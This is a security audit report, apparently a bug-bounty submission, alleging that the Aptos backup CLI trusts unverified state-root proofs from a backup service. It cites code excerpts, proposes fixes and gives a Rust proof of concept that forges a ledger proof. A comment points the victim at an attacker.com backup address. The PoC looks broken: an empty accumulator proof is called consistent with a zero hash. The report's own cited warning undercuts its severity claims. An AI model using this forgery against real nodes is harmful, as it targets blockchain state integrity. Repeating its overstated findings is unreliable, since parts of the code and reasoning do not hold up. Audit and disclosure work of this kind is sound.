# Audit Report

## Title
Arbitrary State Root Injection via Unverified Backup Service Proofs

## Summary
The state snapshot backup system fails to verify cryptographic proofs obtained from the backup service, allowing a malicious backup service to inject arbitrary state roots. When such backups are restored (especially without epoch history verification), nodes accept forged state, enabling complete blockchain state manipulation.

## Finding Description

The vulnerability exists in the state snapshot backup workflow where the backup CLI trusts proofs from the backup service without cryptographic verification.

**Vulnerable Code Path:**

In the backup phase, [1](#0-0) , the code retrieves and deserializes a state root proof from the backup service but performs no cryptographic verification. The `LedgerInfoWithSignatures` containing validator signatures is discarded (assigned to `_`), and the state root hash is extracted without checking authenticity. [2](#0-1) 

This extracted root hash becomes part of the backup manifest without any validation against trusted authorities.

**During Restoration:** [3](#0-2) 

The restore process performs `txn_info_with_proof.verify()` which only validates mathematical consistency between the proof components [4](#0-3) . This verification does NOT check cryptographic signatures—it merely confirms the accumulator proof correctly links to the ledger info's root hash. Since both were forged together by the malicious service, they pass this consistency check.

**Critical Bypass:**

Signature verification only occurs if `epoch_history` is provided [5](#0-4) . However:

1. Many restore scenarios use `None` for epoch_history [6](#0-5) 
2. Even when provided, if the forged epoch exceeds the epoch_history range, verification is bypassed with only a warning [7](#0-6) 

**Attack Scenario:**

1. Attacker operates malicious backup service endpoint
2. Victim configures backup CLI to use malicious service address [8](#0-7) 
3. Malicious service returns forged `(TransactionInfoWithProof, LedgerInfoWithSignatures)` with:
   - Arbitrary state checkpoint hash in TransactionInfo
   - Mathematically consistent accumulator proof
   - Unsigned or invalidly signed LedgerInfo with epoch beyond expected range
4. Backup CLI creates backup containing forged state root
5. Upon restoration without proper epoch_history, or with epoch beyond history range, forged state is accepted
6. Node operates with manipulated blockchain state enabling theft, governance bypass, or consensus violations

## Impact Explanation

**Critical Severity** - This vulnerability enables:

- **Arbitrary State Manipulation**: Attacker injects any state root, allowing creation of arbitrary account balances, governance states, or validator sets
- **Loss of Funds**: Can mint tokens, steal from accounts, or manipulate staking rewards by controlling the state tree
- **Consensus Safety Violation**: Nodes restoring from forged backups diverge from legitimate chain state, breaking the fundamental invariant that "All validators must produce identical state roots for identical blocks"
- **Governance Compromise**: Attacker can fabricate voting power or proposal outcomes by manipulating on-chain governance state

This meets the Critical Severity criteria per Aptos Bug Bounty program: "Loss of Funds (theft or minting)" and "Consensus/Safety violations."

## Likelihood Explanation

**High Likelihood** because:

1. **Simple Attack Vector**: Attacker only needs to run a malicious HTTP service and convince victim to use it as backup endpoint
2. **Common Scenario**: Operators regularly create and restore backups, especially during node recovery or migration
3. **No Special Privileges Required**: No validator access, stake, or insider knowledge needed
4. **Default Configuration Vulnerable**: Many documented restore commands use `epoch_history: None`
5. **Stealthy**: Forged backups appear valid, pass deserialization, and can be stored/distributed as "legitimate" backups

Social engineering to change backup service URL is feasible (misconfiguration, compromised documentation, supply chain attacks).

## Recommendation

**Implement mandatory cryptographic verification during backup creation:**

```rust
async fn write_manifest(
    &self,
    backup_handle: &BackupHandleRef,
    chunks: Vec<StateSnapshotChunk>,
) -> Result<FileHandle> {
    let proof_bytes = self.client.get_state_root_proof(self.version()).await?;
    let (txn_info, li): (TransactionInfoWithProof, LedgerInfoWithSignatures) =
        bcs::from_bytes(&proof_bytes)?;
    
    // FIX: Verify the proof cryptographically
    txn_info.verify(li.ledger_info(), self.version())?;
    
    // FIX: Verify ledger info signatures against trusted validator set
    // This requires passing trusted validator set or waypoint to backup controller
    let trusted_validator_set = self.get_trusted_validator_set_for_epoch(li.ledger_info().epoch())?;
    li.verify_signatures(&trusted_validator_set)?;
    
    let state_root_hash = txn_info
        .transaction_info()
        .ensure_state_checkpoint_hash()?;
    
    // ... rest of function
}
```

**Required changes:**

1. Add trusted validator set / waypoint configuration to `StateSnapshotBackupController`
2. Verify `LedgerInfoWithSignatures` signatures before accepting proof
3. Require epoch_history or trusted waypoint during all restore operations (remove `Option`, make mandatory)
4. Fail hard if signature verification fails—no warnings, only errors

**Additional Hardening:**

- Add backup source authentication (TLS client certificates)
- Implement backup integrity checksums signed by trusted authorities
- Log and alert on signature verification failures

## Proof of Concept

```rust
// Malicious backup service endpoint returning forged proof
use aptos_types::{
    ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    proof::TransactionInfoWithProof,
    transaction::{TransactionInfo, Version},
    aggregate_signature::AggregateSignature,
};

fn forge_state_root_proof(
    malicious_state_root: HashValue,
    target_version: Version,
) -> Vec<u8> {
    // Create forged TransactionInfo with attacker's state root
    let forged_txn_info = TransactionInfo::new(
        HashValue::zero(), // transaction hash
        HashValue::zero(), // state change hash  
        HashValue::zero(), // event root hash
        Some(malicious_state_root), // STATE ROOT - FORGED
        0, // gas used
        ExecutionStatus::Success,
    );
    
    // Create forged LedgerInfo with high epoch to bypass verification
    let forged_ledger_info = LedgerInfo::new(
        BlockInfo::new(
            999999, // epoch beyond expected range
            0,
            HashValue::zero(),
            HashValue::zero(),
            target_version,
            0,
            None,
        ),
        HashValue::zero(),
    );
    
    // Create fake signatures (will be ignored during backup)
    let forged_li_with_sigs = LedgerInfoWithSignatures::new(
        forged_ledger_info,
        AggregateSignature::empty(), // Invalid signatures
    );
    
    // Create mathematically consistent accumulator proof
    let forged_proof = TransactionAccumulatorProof::new(vec![]);
    
    let forged_txn_info_with_proof = TransactionInfoWithProof::new(
        forged_proof,
        forged_txn_info,
    );
    
    // Serialize and return - backup CLI will accept without verification
    bcs::to_bytes(&(forged_txn_info_with_proof, forged_li_with_sigs))
        .unwrap()
}

// Victim runs: aptos-backup-cli state-snapshot --backup-service-address http://attacker.com:6186
// Attacker's service returns forge_state_root_proof() at /state_root_proof/{version} endpoint
// Backup is created with forged state root
// On restore without epoch_history: node accepts malicious state
```

## Notes

This vulnerability demonstrates a fundamental trust boundary violation where external, unauthenticated data (backup service responses) is incorporated into critical blockchain state without cryptographic verification. The issue is exacerbated by:

1. Optional signature verification (epoch_history parameter)
2. Permissive fallback behavior when epochs exceed history range
3. No authentication of backup service identity

The vulnerability affects all users of the backup CLI tool, particularly those performing disaster recovery or node migrations without access to complete epoch history for signature verification.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/backup.rs (L454-456)
```rust
        let proof_bytes = self.client.get_state_root_proof(self.version()).await?;
        let (txn_info, _): (TransactionInfoWithProof, LedgerInfoWithSignatures) =
            bcs::from_bytes(&proof_bytes)?;
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/backup.rs (L468-468)
```rust
            root_hash: txn_info.transaction_info().ensure_state_checkpoint_hash()?,
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L125-139)
```rust
        let (txn_info_with_proof, li): (TransactionInfoWithProof, LedgerInfoWithSignatures) =
            self.storage.load_bcs_file(&manifest.proof).await?;
        txn_info_with_proof.verify(li.ledger_info(), manifest.version)?;
        let state_root_hash = txn_info_with_proof
            .transaction_info()
            .ensure_state_checkpoint_hash()?;
        ensure!(
            state_root_hash == manifest.root_hash,
            "Root hash mismatch with that in proof. root hash: {}, expected: {}",
            manifest.root_hash,
            state_root_hash,
        );
        if let Some(epoch_history) = self.epoch_history.as_ref() {
            epoch_history.verify_ledger_info(&li)?;
        }
```

**File:** types/src/proof/mod.rs (L40-61)
```rust
fn verify_transaction_info(
    ledger_info: &LedgerInfo,
    transaction_version: Version,
    transaction_info: &TransactionInfo,
    ledger_info_to_transaction_info_proof: &TransactionAccumulatorProof,
) -> Result<()> {
    ensure!(
        transaction_version <= ledger_info.version(),
        "Transaction version {} is newer than LedgerInfo version {}.",
        transaction_version,
        ledger_info.version(),
    );

    let transaction_info_hash = transaction_info.hash();
    ledger_info_to_transaction_info_proof.verify(
        ledger_info.transaction_accumulator_hash(),
        transaction_info_hash,
        transaction_version,
    )?;

    Ok(())
}
```

**File:** storage/db-tool/src/restore.rs (L88-95)
```rust
                        StateSnapshotRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                            None, /* epoch_history */
                        )
                        .run()
                        .await?;
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L279-287)
```rust
        if epoch > self.epoch_endings.len() as u64 {
            // TODO(aldenhu): fix this from upper level
            warn!(
                epoch = epoch,
                epoch_history_until = self.epoch_endings.len(),
                "Epoch is too new and can't be verified. Previous chunks are verified and node \
                won't be able to start if this data is malicious."
            );
            return Ok(());
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L126-133)
```rust
    pub async fn get_state_root_proof(&self, version: Version) -> Result<Vec<u8>> {
        let mut buf = Vec::new();
        self.get("state_root_proof", &format!("{}", version))
            .await?
            .read_to_end(&mut buf)
            .await?;
        Ok(buf)
    }
```
